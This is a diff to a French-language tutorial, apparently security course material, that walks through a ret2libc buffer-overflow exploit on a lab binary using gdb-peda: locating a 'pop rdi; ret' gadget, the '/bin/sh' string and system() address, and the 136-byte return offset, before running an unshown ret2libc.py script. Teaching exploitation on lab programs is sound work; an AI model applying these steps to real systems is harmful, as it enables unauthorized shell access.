@@ -34,6 +34,40 @@ ou
 
 gdb-peda$ asmsearch "pop rdi ; ret"
 
-## Chercher la chaîne "/bin/sh"
+## Chercher l'adresse de la chaîne "/bin/sh"
 
 ![ret4](https://github.com/aabda2000/sti3a-security/assets/38082725/e73f41cb-5a46-478e-8a6c-3b82b30164a4)
+
+## Chercher l'adresse de la fonction system
+
+gdb-peda$ p system
+$1 = {int (const char *)} 0x7ffff7e36e50 <__libc_system>
+gdb-peda$
+
+## Chercher l'offset
+
+gdb-peda$ pattern_create 400 entry.txt
+Writing pattern of 400 chars to filename "entry.txt"
+gdb-peda$ 
+gdb-peda$ r < <(cat entry.txt)
+Starting program: /home/insa/advanced/secu/cm/02-ret2libc/ret2libc < <(cat entry.txt)
+
+adress of buf=0x7fffffffde10
+Stopped reason: SIGSEGV
+0x0000000000401178 in vuln () at ret2libc.c:10
+10	}
+gdb-peda$ x/1wx $rsp
+0x7fffffffde98:	0x41514141
+gdb-peda$ pattern offset 0x41514141
+1095844161 found at offset: 136
+
+l'offset vaut 136
+
+La génération d'une erreur de segmentation (et d'un coredump (contenant l'état de la mémoire au moment du décès du processus,
+sous GNU/Linux) est le syndrome que notre application est effectivement affectée par l'insertion d'un trop grand nombre de caractères en entrée.
+
+## Lancez l'attaque
+
+Mettez les différentes adresses trouvées dans le script pyton ret2libc.py et exécutez-le ensuite:
+
+![ret5](https://github.com/aabda2000/sti3a-security/assets/38082725/1880213c-e883-4757-aefa-1679fe2e8eba)
